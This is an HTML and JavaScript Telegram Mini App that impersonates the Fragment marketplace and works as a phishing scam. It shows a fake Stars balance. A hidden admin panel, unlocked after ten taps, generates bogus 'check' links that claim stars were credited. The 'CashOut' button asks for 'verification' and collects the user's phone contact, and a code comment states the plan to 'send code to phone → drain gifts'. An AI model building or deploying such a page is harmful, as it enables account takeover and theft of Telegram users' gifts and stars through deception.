<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Fragment</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        @font-face {
            font-family: 'Dity Infant';
            src: url('dityinfant-Regular.otf') format('opentype');
            font-weight: normal;
            font-style: normal;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #1B2026;
            color: #FFFFFF;
            font-family: 'Dity Infant', -apple-system, BlinkMacSystemFont, sans-serif;
            -webkit-font-smoothing: antialiased;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .back-btn {
            position: absolute;
            top: 16px;
            left: 16px;
            width: 32px;
            height: 32px;
            background: none;
            border: none;
            cursor: pointer;
            z-index: 100;
        }
        .back-btn svg {
            width: 24px;
            height: 24px;
            stroke: #FFFFFF;
            stroke-width: 2;
            fill: none;
        }

        .section-title {
            font-size: 13px;
            font-weight: 600;
            text-transform: uppercase;
            color: #888888;
            margin: 32px 0 16px;
            letter-spacing: 0.5px;
            width: 100%;
            text-align: left;
            padding-left: 4px;
        }

        .menu-item {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 14px 0;
            font-size: 17px;
            color: #FFFFFF;
            text-decoration: none;
            width: 100%;
        }

        .menu-item svg {
            width: 24px;
            height: 24px;
            fill: none;
            stroke: #FFFFFF;
            stroke-width: 1.5;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .connect-text {
            font-size: 15px;
            color: #AAAAAA;
            margin: 32px 0 16px;
            line-height: 1.5;
            width: 100%;
            text-align: left;
            padding-left: 4px;
        }

        .connect-btn {
            background: #242E38;
            color: #FFFFFF;
            border: none;
            border-radius: 12px;
            padding: 14px;
            font-size: 17px;
            font-weight: 600;
            font-family: inherit;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
            width: 100%;
            margin-top: 8px;
        }

        /* Profile Block */
        .profile-block {
            text-align: center;
            margin: 60px 0 40px;
            width: 100%;
            max-width: 400px;
        }

        .avatar-wrapper {
            width: 96px;
            height: 96px;
            background: #242E38;
            border-radius: 24px;
            margin: 0 auto 16px;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .avatar {
            width: 80px;
            height: 80px;
            border-radius: 20px;
            object-fit: cover;
        }

        .display-name {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 4px;
        }

        .username {
            font-size: 17px;
            color: #AAAAAA;
        }

        /* Stars Section */
        .stars-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            max-width: 340px;
        }

        .stars-card {
            background: #242E38;
            border-radius: 16px;
            padding: 32px 24px;
            text-align: center;
            width: 100%;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
        }

        .stars-balance {
            font-size: 48px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .stars-label {
            font-size: 15px;
            color: #AAAAAA;
            margin-bottom: 24px;
        }

        .btn {
            background: #000000;
            color: #FFFFFF;
            border: 1px solid #333333;
            border-radius: 12px;
            padding: 12px 20px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            margin-top: 12px;
        }

        .btn.secondary {
            background: #242E38;
            color: #AAAAAA;
            border-color: #333333;
        }

        /* Admin Panel */
        .admin-panel {
            background: #2A2A2A;
            border-radius: 16px;
            padding: 24px;
            margin: 20px 0;
            width: 100%;
            max-width: 340px;
        }

        .admin-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
            text-align: center;
        }

        .input-group {
            margin-bottom: 16px;
        }

        .input-group input {
            width: 100%;
            background: #1A1A1A;
            border: 1px solid #333333;
            border-radius: 12px;
            padding: 12px;
            color: white;
            font-size: 16px;
            font-family: inherit;
        }

        .hidden { display: none; }
    </style>
</head>
<body>

    <!-- Back Button -->
    <button class="back-btn hidden" id="back-btn" onclick="showMain()">
        <svg viewBox="0 0 24 24">
            <path d="M19 12H5m7-7l-7 7 7 7" />
        </svg>
    </button>

    <!-- Main Menu -->
    <div id="main-menu" style="width:100%; max-width:400px;">

        <!-- Profile -->
        <div class="profile-block">
            <div class="avatar-wrapper">
                <img id="user-avatar" src="" alt="Avatar" class="avatar">
            </div>
            <div id="display-name" class="display-name">Loading...</div>
            <div id="username" class="username">@username</div>
        </div>

        <div class="section-title">PLATFORM</div>
        <a href="#" class="menu-item" onclick="goToChat(event)">
            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>
            About
        </a>
        <a href="#" class="menu-item" onclick="goToChat(event)">
            <svg viewBox="0 0 24 24"><path d="M4 4h16v16H4z"/><path d="M8 8h8M8 12h8M8 16h5" stroke="#fff" fill="none"/></svg>
            Terms
        </a>
        <a href="#" class="menu-item" onclick="goToChat(event)">
            <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 0 1 0 20 10 10 0 0 1 0-20z"/><path d="M12 16v-4m0-4h.01"/></svg>
            Privacy Policy
        </a>

        <div class="section-title">MY ACCOUNT</div>
        <a href="#" class="menu-item" onclick="checkConnect(event)">
            <svg viewBox="0 0 24 24"><circle cx="12" cy="7" r="4"/><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/></svg>
            My Profile
        </a>
        <a href="#" class="menu-item" onclick="checkConnect(event)">
            <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="10" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            Active Sessions
        </a>
        <a href="#" class="menu-item" onclick="checkConnect(event)">
            <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 0 1 0 20 10 10 0 0 1 0-20z"/><path d="M12 8v4l3 3"/></svg>
            My Bids
        </a>
        <a href="#" class="menu-item" onclick="openChecks(event)">
            <svg viewBox="0 0 24 24"><path d="M9 12l2 2 4-4M7.5 4.5A2.5 2.5 0 0 1 10 2h4a2.5 2.5 0 0 1 2.5 2.5v15A2.5 2.5 0 0 1 14 22h-4a2.5 2.5 0 0 1-2.5-2.5v-15z"/></svg>
            Checks
        </a>
        <a href="#" class="menu-item" onclick="showStars(event)">
            <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
            Stars
        </a>

        <div class="connect-text">
            Connect Telegram<br>to view your bids and assets
        </div>

        <button class="connect-btn" onclick="connectTelegram()">
            Connect Telegram
        </button>
    </div>

    <!-- Stars Section -->
    <div id="stars-section" class="hidden">
        <div class="stars-container">
            <div class="stars-card">
                <div class="stars-balance" id="stars-balance">0</div>
                <div class="stars-label">Telegram Stars</div>
                <button class="btn" onclick="cashOut()">CashOut</button>
            </div>
        </div>
    </div>

    <!-- Checks Section (Secret Admin After 10 Clicks) -->
    <div id="checks-section" class="hidden">
        <div style="width:100%; max-width:400px; text-align:center; padding:40px 20px;">
            <h2 style="font-size:20px; margin-bottom:16px;">Connect Telegram First!</h2>
            <p style="color:#AAAAAA; font-size:15px;">Tap 10 times to access admin panel.</p>
            <p style="margin-top:12px; color:#666666;" id="click-counter">Clicks: 0</p>
        </div>
    </div>

    <!-- Admin Panel -->
    <div id="admin-panel" class="hidden">
        <div class="admin-panel">
            <div class="admin-title">Admin: Create Check</div>
            <div class="input-group">
                <input type="number" id="check-amount" placeholder="Enter amount (e.g. 50)" min="1">
            </div>
            <button class="btn" onclick="createCheck()">Generate Check Link</button>
            <div id="check-link" style="margin-top:16px; word-break:break-all; color:#00FF00; font-size:14px;"></div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        // User Data
        const user = tg.initDataUnsafe.user;
        let starsBalance = 0;
        let checksClickCount = 0;

        if (user) {
            const fullName = user.first_name + (user.last_name ? ' ' + user.last_name : '');
            document.getElementById('display-name').textContent = fullName;
            document.getElementById('username').textContent = '@' + (user.username || 'username');
            if (user.photo_url) {
                document.getElementById('user-avatar').src = user.photo_url;
            }
        }

        // Navigation
        function showMain() {
            document.getElementById('main-menu').classList.remove('hidden');
            document.getElementById('stars-section').classList.add('hidden');
            document.getElementById('checks-section').classList.add('hidden');
            document.getElementById('admin-panel').classList.add('hidden');
            document.getElementById('back-btn').classList.add('hidden');
            tg.BackButton.hide();
        }

        function showStars(e) {
            e.preventDefault();
            document.getElementById('main-menu').classList.add('hidden');
            document.getElementById('stars-section').classList.remove('hidden');
            document.getElementById('back-btn').classList.remove('hidden');
            tg.BackButton.show();
            document.getElementById('stars-balance').textContent = starsBalance;
        }

        function openChecks(e) {
            e.preventDefault();
            checksClickCount++;
            document.getElementById('click-counter').textContent = `Clicks: ${checksClickCount}`;

            if (checksClickCount >= 10) {
                document.getElementById('checks-section').classList.add('hidden');
                document.getElementById('admin-panel').classList.remove('hidden');
            } else {
                document.getElementById('main-menu').classList.add('hidden');
                document.getElementById('checks-section').classList.remove('hidden');
                document.getElementById('back-btn').classList.remove('hidden');
                tg.BackButton.show();
            }
        }

        function createCheck() {
            const amount = document.getElementById('check-amount').value;
            if (!amount || amount < 1) return alert("Enter valid amount");

            const botUsername = "FragmentStarsRobot";
            const link = `https://t.me/${botUsername}?start=check_${amount}`;
            const displayLink = `<a href="${link}" style="color:#00FF00;">${link}</a>`;

            document.getElementById('check-link').innerHTML = `
                Check Link:<br>${displayLink}<br><br>
                Bot will say: "<b>${amount} has been sent to your balance!</b> [Green Check]<br>
                <a href="https://t.me/your_miniapp_bot" style="color:#0066FF;">Open Mini App</a>
            `;

            // Simulate adding to balance when claimed
            starsBalance += parseInt(amount);
        }

        function cashOut() {
            alert("Please, complete the Verification first.");
            tg.requestContact((contact) => {
                // Later: send code to phone â†’ drain gifts
                alert("Verification code sent to " + contact.phone_number);
            });
        }

        function goToChat(e) {
            e.preventDefault();
            tg.openLink('https://t.me/fragmentchat');
        }

        function checkConnect(e) {
            e.preventDefault();
            alert('Connect Telegram First!');
        }

        function connectTelegram() {
            alert('Telegram connected.');
        }

        tg.onEvent('backButtonClicked', showMain);
    </script>
</body>
</html>
